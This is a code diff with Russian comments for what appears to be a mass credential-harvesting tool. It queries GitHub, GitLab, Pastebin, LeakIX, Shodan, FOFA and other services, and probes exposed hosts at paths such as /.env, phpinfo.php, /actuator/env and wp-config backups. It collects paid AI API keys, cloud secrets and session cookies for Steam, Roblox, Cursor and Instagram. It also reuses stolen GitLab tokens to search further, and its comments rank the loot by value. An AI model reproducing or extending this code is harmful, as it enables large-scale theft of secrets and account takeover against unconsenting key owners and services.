         ]
         # 🧠 САМОУЛУЧШЕНИЕ: hot/cold статистика запросов.
         # hot (стабильно дают выдачу) — каждый цикл; cold (3 нуля подряд) —
@@ -1666,12 +2041,17 @@ class GitHubCode(Source):
         # каждый токен видит <2 поиска/мин — квота целее) + потом параллельный
         # фетч файлов. Покрытие x4-x5 за то же время = МАССОВАЯ находка ключей.
         _ratelimit_hit = threading.Event()
+        _403s = [0]  # подряд идущие 403 по всему пулу (для circuit-breaker)
+        _403_lock = threading.Lock()  # аудит-фикс: счётчик мутировался из 4
+        # воркеров без лока — потерянные инкременты = дольше молотим 403
 
         def _run_query(q):
             """Один поиск: свой токен, статистика, эволюция. -> (q, items)"""
             if _ratelimit_hit.is_set():
                 return q, []
             for _attempt in range(3):  # мёртвый токен -> следующий, не режем батч
+                if _ratelimit_hit.is_set():
+                    return q, []
                 try:
                     tok = gh_token()
                     h = dict(headers)
@@ -1693,13 +2073,49 @@ class GitHubCode(Source):
                             pass
                         continue
                     if r.status_code == 403:
-                        # rate-limit токена: следующий в пуле (не глобальный обрыв)
-                        _t.sleep(2)
+                        # rate-limit токена. Retry-After (secondary RL) — уважаем.
+                        # Весь пул выжат (403 подряд >= 2x pool) -> глушим батч
+                        # (было: _ratelimit_hit никогда не сетился — мёртвый
+                        # circuit-breaker, пул жрал 403 в 4 потока до конца)
+                        ra = 0
+                        try:
+                            ra = int(r.headers.get("Retry-After") or 0)
+                        except Exception:
+                            pass
+                        with _403_lock:
+                            _403s[0] += 1
+                            _over = (
+                                _403s[0]
+                                >= (len(CFG.get("github_tokens_pool") or []) or 1) * 2
+                            )
+                        if _over:
+                            _ratelimit_hit.set()
+                        _t.sleep(max(2, min(ra, 30)))
                         continue
-                    _t.sleep(6)  # щадим квоту (внутри своего воркера)
                     if r.status_code != 200:
                         return q, []
+                    with _403_lock:
+                        _403s[0] = 0
+                    _t.sleep(6)  # щадим квоту (только успешные; было: и на 422)
                     items = r.json().get("items", [])[:25]
+                    # page 2 для hot-запросов: полная первая страница = за ней ещё
+                    if q in hot and len(items) >= 20 and not _ratelimit_hit.is_set():
+                        try:
+                            _t.sleep(6)
+                            tok2 = gh_token()
+                            h2 = dict(headers)
+                            h2["Authorization"] = "Bearer " + tok2
+                            r3 = http(
+                                "GET",
+                                "https://api.github.com/search/code?q=%s&per_page=20&page=2&sort=indexed&order=desc"
+                                % urlquote(q),
+                                timeout=(8, 15),
+                                headers=h2,
+                            )
+                            if r3.status_code == 200:
+                                items += r3.json().get("items", [])[:25]
+                        except Exception:
+                            pass
                     # 🧠 учёба + 🧬 эволюция
                     try:
                         st = _qget(q)
@@ -1735,18 +2151,29 @@ class GitHubCode(Source):
 
         def _fetch_item(pair):
             item, html = pair
-            try:
-                api = item.get("url")
-                r2 = http("GET", api, timeout=(6, 12), headers=headers)
-                if r2.status_code == 200:
-                    import base64
+            api = item.get("url")
+            # свежий токен на КАЖДЫЙ фетч (было: один токен из fetch-скоупа на
+            # все 220 файлов — его смерть/ротация убивала весь фетч-пакет)
+            for _try in range(2):
+                try:
+                    tok = gh_token()
+                    if not tok:
+                        break
+                    h = dict(headers)
+                    h["Authorization"] = "Bearer " + tok
+                    r2 = http("GET", api, timeout=(6, 12), headers=h)
+                    if r2.status_code in (401, 403) and _try == 0:
+                        continue  # токен мёртв/релимит — другой токен, 1 ретрай
+                    if r2.status_code == 200:
+                        import base64
 
-                    raw = base64.b64decode(r2.json().get("content", "")).decode(
-                        "utf-8", "replace"
-                    )
-                    return (raw, html)
-            except Exception:
-                pass
+                        raw = base64.b64decode(r2.json().get("content", "")).decode(
+                            "utf-8", "replace"
+                        )
+                        return (raw, html)
+                    break
+                except Exception:
+                    break
             return None
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
@@ -1778,7 +2205,8 @@ class GitHubCommits(Source):
         }
         # ищем коммиты, где удаляли .env / ключи ("remove key", "remove env")
         for q in (
-            '"remove api key" path:.env',
+            # АУДИТ-фикс: commit-search не поддерживает path: — 422 каждый цикл
+            '"remove api key" .env',
             '"remove secrets"',
             'revert ".env"',
             '"delete .env"',
@@ -1924,6 +2352,93 @@ class GitLab(Source):
         "new-api",
     )
     _rot = 0
+    _rot_blob = 0
+    # blob-поиск по коду (scope=blobs) — требует glpat; сидим из СТОРА
+    # (найденные glpat- токены работают на нас, как gh-пул)
+    BLOB_QUERIES = (
+        "sk-ant-oat01",
+        "sk-ant-sid01",
+        "sk-proj-",
+        "sk-or-v1-",
+        "claudeAiOauth",
+        "APP_KEY=base64",
+        "LITELLM_MASTER_KEY",
+        "OPENAI_API_KEY",
+        "xoxb-",
+        "glpat-",
+    )
+
+    def _glpat_pool(self):
+        pool = []
+        try:
+            for l in open(STORE_PATH, encoding="utf-8"):
+                try:
+                    j = json.loads(l)
+                except Exception:
+                    continue
+                k = str(j.get("key") or "")
+                if k.startswith("glpat-") and j.get("status") in (
+                    "working",
+                    "listed_only",
+                ):
+                    pool.append(k)
+        except Exception:
+            pass
+        return list(dict.fromkeys(pool))
+
+    def _blob_search(self, out):
+        pool = self._glpat_pool()
+        if not pool:
+            return
+        rot = GitLab._rot_blob
+        GitLab._rot_blob = (rot + 2) % len(self.BLOB_QUERIES)
+        qs = [self.BLOB_QUERIES[(rot + i) % len(self.BLOB_QUERIES)] for i in range(2)]
+        tok = pool[rot % len(pool)]
+        hdrs = {"PRIVATE-TOKEN": tok, "Accept": "application/json"}
+        for q in qs:
+            try:
+                r = http(
+                    "GET",
+                    "https://gitlab.com/api/v4/search?scope=blobs&search=%s&per_page=20"
+                    % urlquote(q),
+                    timeout=(10, 20),
+                    headers=hdrs,
+                )
+                if r is None or r.status_code in (401, 403):
+                    break  # токен мёртв/без права — не насилуем
+                if r.status_code == 429:
+                    break
+                if r.status_code != 200:
+                    continue
+                for b in (r.json() or [])[:20]:
+                    snip = b.get("data") or ""
+                    if snip.strip():
+                        out.append((snip, "gitlab-blob:%s" % b.get("project_id", "?")))
+                    # полный файл по пути (ключи висят кластерами)
+                    pid, fpath = b.get("project_id"), b.get("path")
+                    if pid and fpath:
+                        for br in ("main", "master"):
+                            try:
+                                rr = http(
+                                    "GET",
+                                    "https://gitlab.com/api/v4/projects/%s"
+                                    "/repository/files/%s/raw?ref=%s"
+                                    % (pid, urlquote(fpath, safe=""), br),
+                                    timeout=(6, 12),
+                                    headers=hdrs,
+                                )
+                                if rr is not None and rr.status_code == 200:
+                                    out.append(
+                                        (
+                                            rr.text[:300_000],
+                                            "gitlab-file:%s:%s" % (pid, fpath[:40]),
+                                        )
+                                    )
+                                    break
+                            except Exception:
+                                continue
+            except Exception:
+                continue
 
     def fetch(self):
         out = []
@@ -1933,6 +2448,11 @@ class GitLab(Source):
         terms = [
             self.SEARCH_TERMS[(rot + i) % len(self.SEARCH_TERMS)] for i in range(2)
         ]
+        # 🩸 blob-поиск с glpat-пулом (self-seed из стора)
+        try:
+            self._blob_search(out)
+        except Exception:
+            pass
         for term in terms:
             try:
                 r = http(
@@ -2108,10 +2628,15 @@ class Pastebin(Source):
     def fetch(self):
         out = []
         try:
-            txt, code = fetch_text("https://pastebin.com/archive", (8, 15), 300_000)
+            # CF-фронт: cloudscraper с прокси-фолбэком (было: голый fetch_text
+            # — челлендж = "HTTP403" и пустой источник)
+            r = cloud_get("https://pastebin.com/archive")
+            txt = r.text if (r is not None and r.status_code == 200) else ""
             if not txt:
-                log("  [pastebin] HTTP%s" % code)
-                return out
+                txt, code = fetch_text("https://pastebin.com/archive", (8, 15), 300_000)
+                if not txt:
+                    log("  [pastebin] HTTP%s" % code)
+                    return out
             ids = re.findall(r'href="/([A-Za-z0-9]{6,12})(?:\?[^"\s]*)?"', txt)
             skip = (
                 "archive",
@@ -2224,15 +2749,19 @@ class SearchDDG(Source):
             except Exception:
                 page = None
             targets = []
-            if page:
+            # DDG bot-challenge: 200-страница без результатов ("bots use
+            # DuckDuckGo too") — page truthy, но матчей ноль -> фолбэк на Bing
+            ddg_ok = bool(page) and 'class="result__a"' in page
+            if page and ddg_ok:
                 for sm in re.finditer(
                     r'class="result__snippet"[^>]*>(.*?)</a>', page, re.S
                 ):
                     snip = htmllib.unescape(re.sub(r"<[^>]+>", "", sm.group(1)))
                     if len(snip) > 20:
                         out.append((snip, "ddg:" + q[:20]))
+                # реальный порядок атрибутов DDG: class ПЕРЕД href
                 for m in re.finditer(
-                    r'<a[^>]+href="([^"]+)"[^>]*class="result__a"', page
+                    r'<a[^>]*class="result__a"[^>]*href="([^"]+)"', page
                 ):
                     href = m.group(1)
                     if "uddg=" in href:
@@ -2243,7 +2772,7 @@ class SearchDDG(Source):
                     else:
                         continue
                     targets.append(real)
-            else:
+            if not ddg_ok:
                 # 2) Bing фолбэк (когда DDG заблокирован)
                 try:
                     rb = sess.get(
@@ -2407,11 +2936,32 @@ class LeakIX(Source):
         '"modelscope" "ms-"',
     )
 
+    STATE_PATH = os.path.join(HERE, "leakix_state.json")
+
     def fetch(self):
         if not CFG.get("leakix_key"):
             return []
         out = []
         h = {"api-key": CFG["leakix_key"], "Accept": "application/json"}
+        # АУДИТ-фикс: персистентный дедуп + ранний стоп пагинации — было:
+        # 15 запросов × 4 страницы КАЖДЫЙ цикл по одним и тем же выдачам =
+        # месячный кап сгорал на перекачке старья.
+        try:
+            _st = json.load(open(self.STATE_PATH, encoding="utf-8"))
+        except Exception:
+            _st = {}
+        seen = set(_st.get("seen") or [])
+        heads = _st.get("heads") or {}
+
+        def _fp(item):
+            return hashlib.sha1(
+                (
+                    str(item.get("host") or item.get("ip") or "")
+                    + "|"
+                    + str(item.get("summary") or "")[:120]
+                ).encode()
+            ).hexdigest()[:20]
+
         for q in self.QUERIES:
             # пагинация: страницы 0-3 = до 80 результатов на запрос
             for page in range(4):
@@ -2423,12 +2973,37 @@ class LeakIX(Source):
                         timeout=(20, 40),
                         headers=h,
                     )
+                    if r is not None and r.status_code == 429:
+                        time.sleep(6)  # rate-limit: один ретрай (было: молчали
+                        # и обрывали пагинацию по ВСЕМ запросам сразу)
+                        try:
+                            r = http(
+                                "GET",
+                                "https://leakix.net/search?scope=leak&q=%s&page=%d"
+                                % (urlquote(q), page),
+                                timeout=(20, 40),
+                                headers=h,
+                            )
+                        except Exception:
+                            r = None
                     if r is None or r.status_code != 200:
                         break
                     j = r.json()
                     if not isinstance(j, list) or not j:
                         break
+                    # голова выдачи не изменилась = страницы 1-3 не новее —
+                    # НЕ жжём запросы на них
+                    if page == 0:
+                        head = _fp(j[0])
+                        if heads.get(q) == head and all(_fp(it) in seen for it in j):
+                            break
+                        heads[q] = head
+                    page_new = 0
                     for item in j:
+                        fp = _fp(item)
+                        if fp in seen:
+                            continue
+                        seen.add(fp)
                         # ключи в summary (полный дамп окружения) и service
                         blob = (
                             (item.get("summary") or "")
@@ -2440,8 +3015,19 @@ class LeakIX(Source):
                         if blob.strip():
                             host = item.get("host") or item.get("ip") or "?"
                             out.append((blob, "leakix:%s" % host))
+                            page_new += 1
+                    # страница без единой новой записи = дальше только старьё
+                    if page > 0 and page_new == 0:
+                        break
                 except Exception:
                     continue
+        try:
+            _tmp = self.STATE_PATH + ".tmp"
+            with open(_tmp, "w", encoding="utf-8") as _f:
+                json.dump({"seen": list(seen)[-6000:], "heads": heads}, _f)
+            os.replace(_tmp, self.STATE_PATH)
+        except Exception:
+            pass
         return out
 
 
@@ -2467,7 +3053,13 @@ class VirusTotal(Source):
                         doms.append(base)
         except Exception:
             pass
-        for dom in list(dict.fromkeys(doms))[:12]:
+        doms = list(dict.fromkeys(doms))
+        # АУДИТ-фикс: фиксированное [:12] окно — новые релеи не сканировались
+        if len(doms) > 12:
+            _rot = int(time.time() // 900)
+            _st = (_rot * 12) % len(doms)
+            doms = [doms[(_st + i) % len(doms)] for i in range(12)]
+        for dom in doms:
             try:
                 r = http(
                     "GET",
@@ -2476,6 +3068,17 @@ class VirusTotal(Source):
                     timeout=(12, 25),
                     headers=h,
                 )
+                # public API: 4 req/min — burst из 12 доменов мгновенно 429.
+                # один ретрай после паузы + 3с между доменами
+                if r is not None and r.status_code == 429:
+                    time.sleep(15)
+                    r = http(
+                        "GET",
+                        "https://www.virustotal.com/api/v3/domains/%s/subdomains?limit=40"
+                        % dom,
+                        timeout=(12, 25),
+                        headers=h,
+                    )
                 if r is None or r.status_code != 200:
                     continue
                 subs = [d.get("id") for d in (r.json().get("data") or [])]
@@ -2486,6 +3089,7 @@ class VirusTotal(Source):
                 ]
                 if apiish:
                     out.append(("\n".join(apiish), "virustotal:%s" % dom))
+                time.sleep(3)
             except Exception:
                 continue
         return out
@@ -2812,6 +3416,60 @@ class Shodan(Source):
         ('http.title:"Index of /" "id_rsa"', 2),
         ('port:21 "230" "anonymous"', 2),  # анонимные FTP — классика дампов
         ('port:873 "rsync"', 1),  # rsync-шары
+        # ============ 🐘 ENV-ДАМП ВОЛНА: phpinfo / actuator / APP_KEY ============
+        ('http.title:"phpinfo()"', 2),  # phpinfo = полный env/$_SERVER дамп
+        ('http.html:"propertySources"', 1),  # spring /actuator/env в индексе
+        ('http.html:"APP_KEY=base64:"', 2),  # laravel APP_KEY (форж сессий)
+        ('http.html:"xoxb-"', 1),  # slack bot tokens
+        ('http.html:"MAIL_MAILER=smtp"', 2),  # laravel mail-конфиги (креды рядом)
+        # ============ 🎮 ЖИРНЫЕ СЕССИИ + 🤖 AI-ПОДПИСКИ (куки в дампах) ============
+        ('http.html:".ROBLOSECURITY"', 2),  # roblox-сессии (ROBUX)
+        ('http.html:"steamLoginSecure"', 2),  # steam-сессии
+        ('http.html:"WorkosCursorSessionToken"', 2),  # Cursor Pro сессии!
+        ('http.html:"MSPAuth="', 1),  # Microsoft Copilot/Office сессии
+        ('http.html:"reddit_session"', 1),
+        ('http.html:"sb-" "-auth-token="', 1),  # supabase auth куки (Lovable/Bolt)
+        ('http.html:"sessionid" "instagram.com"', 1),  # instagram-сессии
+        ('http.html:"auth_token" "twitter.com"', 1),  # X-сессии (= Grok доступ)
+        ('http.html:"m-b=" "poe.com"', 1),  # Poe сессии (Claude+GPT)
+        # ============ 💎 ПРЯМЫЕ КЛЮЧ-СТРОКИ (платные ключи в теле страниц) ============
+        ('http.html:"sk-proj-"', 3),  # OpenAI project keys — самые платные
+        ('http.html:"sk-ant-api03"', 3),  # Anthropic API keys
+        ('http.html:"sk-or-v1-"', 2),  # OpenRouter
+        (
+            'http.html:"SUPABASE_SERVICE_ROLE_KEY"',
+            2,
+        ),  # service_role = полный доступ к БД (обходит RLS!)
+        ('http.html:"service_role" "supabase"', 1),
+        ('http.html:"AZURE_OPENAI_API_KEY"', 2),  # Azure OpenAI = КОРПОРАТИВНЫЕ жирные
+        ('http.html:"openai.azure.com" "api-key"', 2),
+        ('http.html:"AWS_SECRET_ACCESS_KEY"', 1),  # AWS = облако
+        ('http.html:"BEGIN PRIVATE KEY"', 1),  # GCP service accounts / приватники
+        ('http.html:"OPENAI_API_KEY" "sk-"', 1),
+        ('http.html:"ANTHROPIC_API_KEY" "sk-ant"', 1),
+        # ============ 🚀 GLM/Kimi/ПРОВАЙДЕР-ДАМПЫ (экспансия 2026-09-10) ============
+        ('http.html:"ZHIPU_API_KEY"', 2),  # zhipu/GLM официал
+        ('http.html:"BIGMODEL"', 1),
+        ('http.html:"open.bigmodel.cn"', 2),
+        ('http.html:"MOONSHOT_API_KEY"', 2),  # Kimi официал
+        ('http.html:"api.moonshot.cn" "sk-"', 2),
+        ('http.html:"SILICONFLOW_API_KEY"', 1),
+        ('http.html:"BASETEN_API_KEY"', 2),  # baseten: GLM/Kimi инференс
+        ('http.html:"inference.baseten.co"', 1),
+        ('http.html:"DEEPINFRA_API_KEY"', 1),
+        ('http.html:"NOVITA_API_KEY"', 1),
+        ('http.html:"CEREBRAS_API_KEY"', 1),
+        ('http.html:"SAMBANOVA_API_KEY"', 1),
+        ('http.html:"CHUTES_API_KEY"', 1),
+        ('http.html:"HYPERBOLIC_API_KEY"', 1),
+        ('http.html:"DASHSCOPE_API_KEY"', 1),  # qwen официал
+        ('http.html:"STEPFUN_API_KEY"', 1),
+        ('http.html:"MINIMAX_API_KEY"', 1),
+        ('http.html:"DOUBAO_API_KEY"', 1),  # volces ark
+        ('http.html:"OPENROUTER_API_KEY" "sk-or-"', 2),
+        ('http.html:"GROQ_API_KEY" "gsk_"', 1),
+        ('http.html:"DEEPSEEK_API_KEY" "sk-"', 2),
+        ('http.html:"MOONSHOT"', 1),
     ]
 
     def _key_pool(self):
@@ -2843,6 +3501,9 @@ class Shodan(Source):
         "/.env.local",
         "/.env.production",
         "/.env.bak",
+        "/.env.old",  # бэкапы .env — классика мисконфига
+        "/.env.save",
+        "/.env.backup",
         "/config.json",
         "/robots.txt",
         "/.git/config",
@@ -2858,12 +3519,43 @@ class Shodan(Source):
         "/.codex/auth.json",
         "/codex/auth.json",
         "/auth.json",
+        # 🐘 phpinfo(): $_SERVER/env секция вываливает ВСЕ переменные окружения
+        # (API-ключи, DB-креды) — один из самых жирных мисконфигов PHP
+        "/phpinfo.php",
+        "/info.php",
+        "/php_info.php",
+        "/test.php",
+        "/pinfo.php",
+        # 🍃 Spring Boot Actuator: /actuator/env = полный дамп env-переменных
+        "/actuator/env",
+        "/actuator/configprops",
+        # 📝 WordPress: бэкапы wp-config (DB + AUTH_KEY/SALT + часто API-ключи)
+        "/wp-config.php.bak",
+        "/wp-config.php.old",
+        "/wp-config.php.txt",
+        "/wp-config.php.swp",
+        # 🐘 Laravel: логи с токенами/кредами в stacktrace
+        "/storage/logs/laravel.log",
+        "/log.log",
+        # 📘 Swagger/OpenAPI: в examples/servers часто живые ключи + база API
+        "/swagger.json",
+        "/openapi.json",
+        "/api-docs",
+        "/v2/api-docs",
+        "/swagger/v1/swagger.json",
+        # 🔧 Jenkins: consoleText последнего билда — env-дамп с секретами
+        "/lastBuild/consoleText",
     )
 
-    def _live_scrape(self, hosts):
+    def _live_scrape(self, hosts, time_cap=170):
         out = []
         if not hosts:
             return out
+        # АУДИТ-фикс: scrape работал БЕЗ дедлайна (64 хоста × 37 путей × 6с /
+        # 24 воркера ≈ +590с ПОВЕРХ shodan_budget) — весь fetch вываливался
+        # за source_timeout, результаты выбрасывались, источник ловил
+        # health-strike'и и периодически банился на 5 циклов. Жёсткий cap.
+        dl = time.time() + time_cap
 
         def scrape(hp):
             scheme, host, port = hp
@@ -2872,6 +3564,8 @@ class Shodan(Source):
             base = "%s://%s:%s" % (scheme, host, port)
             texts = []
             for path in self.SCRAPE_PATHS:
+                if time.time() > dl:
+                    break
                 try:
                     r = requests.get(base + path, timeout=(2, 4), verify=False)
                     if r.status_code == 200 and len(r.text) > 10:
@@ -2888,7 +3582,6 @@ class Shodan(Source):
                                 "oat01",
                                 "ort01",
                                 "sid01",
-                                "ms-",
                                 "claudeAiOauth",
                                 "oauthAccount",
                                 "sessionKey",
@@ -2903,6 +3596,21 @@ class Shodan(Source):
                                 "grafana_session",
                                 "Netscape HTTP Cookie File",
                                 "access_token",
+                                # 🐘 phpinfo / spring / wp-config / laravel-логи
+                                "PHP Version",
+                                "propertySources",
+                                "DB_PASSWORD",
+                                "APP_KEY",
+                                "AUTH_KEY",
+                                "MAIL_PASSWORD",
+                                "SECRET",
+                                "password",
+                                "Bearer ",
+                                "AKIA",
+                                "xoxb-",
+                                "glpat-",
+                                # "ms-" убран: матчит CSS -ms- префикс = половина
+                                # интернета проходила фильтр впустую
                             )
                         ):
                             texts.append((t, "shodan-live:%s%s" % (base, path)))
@@ -2911,8 +3619,14 @@ class Shodan(Source):
             return texts
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
-            for texts in ex.map(scrape, hosts):
-                out.extend(texts)
+            futs = [ex.submit(scrape, h) for h in hosts]
+            for f in concurrent.futures.as_completed(futs):
+                if time.time() > dl:
+                    break  # дедлайн: остаток хостов в следующий цикл
+                try:
+                    out.extend(f.result(timeout=max(1, dl - time.time())))
+                except Exception:
+                    continue
         if out:
             log("  [shodan] live-scrape: %d файлов с ключами" % len(out))
         return out
@@ -2923,7 +3637,8 @@ class Shodan(Source):
         лейны съедали 5/6 запросов цикла. Теперь ВСЕ запросы идут по живым
         ключам (edu 194k кредитов = жрём на полную)."""
         alive = []
-        for k in keys[:12]:  # безлимит: проверяем весь пул, не только топ-6
+        for k in keys:  # безлимит: проверяем ВЕСЬ пул (было keys[:12] — хвост
+            # пула никогда не валидировался и не использовался)
             try:
                 r = requests.get(
                     "https://api.shodan.io/api-info",
@@ -2975,9 +3690,24 @@ class Shodan(Source):
             "sk-ant-admin01",
             "expiresAt",
             "subscriptionType",
+            # 💎 прямые ключ-строки — самые платные находки, каждый цикл
+            "sk-proj-",
+            "sk-ant-api03",
+            "SUPABASE_SERVICE_ROLE_KEY",
+            "AZURE_OPENAI_API_KEY",
         )
-        pinned = [qd for qd in self.QUERIES if any(p in qd[0] for p in PIN)]
-        rest = [qd for qd in self.QUERIES if qd not in pinned]
+        # дедуп запросов (в списке были дубли: ANTHROPIC_BASE_URL x2,
+        # .claude.json x2, DATABASE_URL/MAIL_PASSWORD разной глубины —
+        # каждая копия жгла кредиты дважды за цикл)
+        _seen_q = set()
+        _uq = []
+        for _qd in self.QUERIES:
+            if _qd[0] in _seen_q:
+                continue
+            _seen_q.add(_qd[0])
+            _uq.append(_qd)
+        pinned = [qd for qd in _uq if any(p in qd[0] for p in PIN)]
+        rest = [qd for qd in _uq if qd not in pinned]
         if rest:
             shift = (cycle_idx * 97) % len(rest)
             rest = rest[shift:] + rest[:shift]
@@ -3019,8 +3749,19 @@ class Shodan(Source):
                 return r
             return None
 
-        def run_queries(q_list, key):
+        def run_queries(q_list, key, shared_out=None):
+            # shared_out: инкрементальный слив результатов в ОБЩИЙ список —
+            # раньше лейн, упершийся в таймаут фьючи, ТЕРЯЛ всё собранное
             res = []
+            sink = shared_out if shared_out is not None else res
+
+            def _emit(item):
+                if shared_out is not None:
+                    with lock:
+                        shared_out.append(item)
+                else:
+                    res.append(item)
+
             deadline = time.time() + shodan_budget
             for q, pages in q_list:
                 if time.time() >= deadline:
@@ -3037,8 +3778,9 @@ class Shodan(Source):
                         r = _get_page(key, q, real_page)
                         if r is None:
                             break
-                        if r.status_code == 403:
-                            return res  # кредиты кончились
+                        if r.status_code in (402, 403):
+                            return res  # кредиты кончились (402 = out of credits,
+                            # было: ждали только 403 -> лейн молча жёг остаток цикла)
                         if r.status_code != 200:
                             break
                         with lock:
@@ -3052,61 +3794,63 @@ class Shodan(Source):
                             break
                         for match in matches:
                             html_txt = (match.get("http") or {}).get("html") or ""
-                            if html_txt and any(
-                                m in html_txt
-                                for m in (
-                                    "sk-",
-                                    "gsk_",
-                                    "hf_",
-                                    "ms-",
-                                    "AIza",
-                                    "nvapi-",
-                                    "glpat-",
-                                    "github_pat_",
-                                    "ghp_",
-                                    "gho_",
-                                    "pplx-",
-                                    "r8_",
-                                    "vck_",
-                                    "jina_",
-                                    "sk_live_",
-                                    "rk_live_",
-                                    "tgp_v1_",
-                                    "csk-",
-                                    "sbp_",
-                                    "oat01",
-                                    "ort01",
-                                    "sid01",
-                                    "setup_token",
-                                    "API_KEY",
-                                    "api_key",
-                                    # 🍪 куки-волна: пропускаем сессионный контент
-                                    "Cookie:",
-                                    "laravel_session",
-                                    "wordpress_logged_in_",
-                                    "wordpress_sec_",
-                                    "PHPSESSID",
-                                    "JSESSIONID",
-                                    "ASP.NET_SessionId",
-                                    ".ASPXAUTH",
-                                    "grafana_session",
-                                    "connect.sid",
-                                    "Netscape HTTP Cookie File",
-                                    "access_token",
-                                    "refresh_token",
-                                    "Set-Cookie:",
-                                    "sessionKey",
-                                    "session_id",
-                                    # 🎫 codex/подписки/дампы: структурные маркеры
-                                    "subscriptionType",
-                                    "chatgpt-account-id",
-                                    "__Secure-next-auth",
-                                    "ListBucketResult",
-                                    "auth.json",
-                                    "id_token",
+                            if html_txt and (
+                                re.search(r"(?<![\w/=-])ms-[0-9a-f]{8}-", html_txt)
+                                or any(
+                                    m in html_txt
+                                    for m in (
+                                        "sk-",
+                                        "gsk_",
+                                        "hf_",
+                                        "AIza",
+                                        "nvapi-",
+                                        "glpat-",
+                                        "github_pat_",
+                                        "ghp_",
+                                        "gho_",
+                                        "pplx-",
+                                        "r8_",
+                                        "vck_",
+                                        "jina_",
+                                        "sk_live_",
+                                        "rk_live_",
+                                        "tgp_v1_",
+                                        "csk-",
+                                        "sbp_",
+                                        "oat01",
+                                        "ort01",
+                                        "sid01",
+                                        "setup_token",
+                                        "API_KEY",
+                                        "api_key",
+                                        # 🍪 куки-волна: пропускаем сессионный контент
+                                        "Cookie:",
+                                        "laravel_session",
+                                        "wordpress_logged_in_",
+                                        "wordpress_sec_",
+                                        "PHPSESSID",
+                                        "JSESSIONID",
+                                        "ASP.NET_SessionId",
+                                        ".ASPXAUTH",
+                                        "grafana_session",
+                                        "connect.sid",
+                                        "Netscape HTTP Cookie File",
+                                        "access_token",
+                                        "refresh_token",
+                                        "Set-Cookie:",
+                                        "sessionKey",
+                                        "session_id",
+                                        # 🎫 codex/подписки/дампы: структурные маркеры
+                                        "subscriptionType",
+                                        "chatgpt-account-id",
+                                        "__Secure-next-auth",
+                                        "ListBucketResult",
+                                        "auth.json",
+                                        "id_token",
+                                    )
                                 )
                             ):
-                                res.append(
+                                _emit(
                                     (
                                         html_txt,
                                         "shodan:%s:%s"
@@ -3142,14 +3886,15 @@ class Shodan(Source):
                 max_workers=len(multi_keys)
             ) as ex:
                 futs = {
-                    ex.submit(run_queries, buckets[i], k): k
+                    ex.submit(run_queries, buckets[i], k, out): k
                     for i, k in enumerate(multi_keys)
                 }
                 for fut in concurrent.futures.as_completed(futs):
                     try:
-                        with lock:
-                            out.extend(fut.result(timeout=shodan_budget + 60))
+                        fut.result(timeout=shodan_budget + 60)
                     except Exception:
+                        # лейн-таймаут: частичные результаты УЖЕ в out
+                        # (shared sink) — больше ничего не теряем
                         continue
         else:
             out = run_queries(active, keys[0])
@@ -3194,7 +3939,8 @@ class AnonFtp(Source):
     )
 
     def _targets(self, n=12):
-        keys = Shodan()._key_pool()
+        # живой пул (было: keys[0] — мёртвый ключ убивал весь FTP-источник)
+        keys = Shodan()._alive_pool(Shodan()._key_pool())
         if not keys:
             return []
         page = 1 + (int(time.time() // 900) % 40)
@@ -3433,14 +4179,44 @@ class BasetenHunter(Source):
                         "https://registry-1.docker.io/v2/%s/manifests/%s" % (repo, tag),
                         headers={
                             "Authorization": "Bearer " + tk,
-                            "Accept": "application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json",
+                            # + manifest-list/OCI-index: современные теги отдают
+                            # СПИСОК манифестов (без него multi-arch = мимо)
+                            "Accept": "application/vnd.docker.distribution.manifest.v2+json,"
+                            "application/vnd.oci.image.manifest.v1+json,"
+                            "application/vnd.docker.distribution.manifest.list.v2+json,"
+                            "application/vnd.oci.image.index.v1+json",
                         },
                         timeout=(6, 15),
                         verify=False,
                     )
                     if man.status_code != 200:
                         continue
-                    dg = (man.json().get("config") or {}).get("digest")
+                    mj = man.json()
+                    dg = (mj.get("config") or {}).get("digest")
+                    if not dg and mj.get("manifests"):
+                        # manifest-list: берём amd64/linux (или первый не-attest)
+                        sub = None
+                        for m0 in mj["manifests"]:
+                            plat = m0.get("platform") or {}
+                            if plat.get("os") in (None, "unknown"):
+                                continue  # buildx attestation — не конфиг
+                            if plat.get("architecture") == "amd64":
+                                sub = m0
+                                break
+                            sub = sub or m0
+                        if sub and sub.get("digest"):
+                            man2 = requests.get(
+                                "https://registry-1.docker.io/v2/%s/manifests/%s"
+                                % (repo, sub["digest"]),
+                                headers={
+                                    "Authorization": "Bearer " + tk,
+                                    "Accept": "application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json",
+                                },
+                                timeout=(6, 15),
+                                verify=False,
+                            )
+                            if man2.status_code == 200:
+                                dg = (man2.json().get("config") or {}).get("digest")
                     if not dg:
                         continue
                     blob = requests.get(
@@ -3480,11 +4256,15 @@ class BasetenHunter(Source):
             if r.status_code != 200:
                 return out
             for h in ((r.json().get("hits") or {}).get("hits") or [])[:25]:
-                repo, branch, path = (
-                    h.get("repo"),
-                    h.get("branch") or "master",
-                    h.get("path"),
-                )
+                # grep.app schema: repo/branch/path = {"raw": "..."} объекты
+                def _raw(x, default=""):
+                    if isinstance(x, dict):
+                        return x.get("raw") or default
+                    return x or default
+
+                repo = _raw(h.get("repo"))
+                branch = _raw(h.get("branch"), "master")
+                path = _raw(h.get("path"))
                 snip = (h.get("content") or {}).get("snippet") or ""
                 plain = _html.unescape(re.sub(r"<[^>]+>", "", snip))
                 if "baseten" in plain.lower() and self.K832.search(plain):
@@ -3534,7 +4314,9 @@ class Fofa(Source):
 
         for q in CFG["fofa_queries"]:
             try:
-                qb = b64.b64encode(q.encode()).decode()
+                # urlsafe + urlquote: голый base64 содержит +/- и падает в
+                # query-string (было: ~1/3 запросов портится на сервере)
+                qb = urlquote(b64.urlsafe_b64encode(q.encode()).decode())
                 r = http(
                     "GET",
                     "https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=50"
@@ -3546,12 +4328,18 @@ class Fofa(Source):
                 for res in (r.json().get("results") or [])[:50]:
                     if isinstance(res, list) and len(res) >= 2:
                         host = res[0]
-                        for scheme in ("https", "http"):
-                            u = "%s://%s" % (scheme, host)
+                        # fofa отдаёт host УЖЕ со схемой для веб-сервисов
+                        # (было: "https://https://1.2.3.4" -> InvalidURL)
+                        if str(host).startswith(("http://", "https://")):
+                            candidates = [host]
+                        else:
+                            candidates = ["https://" + host, "http://" + host]
+                        for u in candidates:
                             try:
                                 t, _ = fetch_text(u, (6, 12), 400_000)
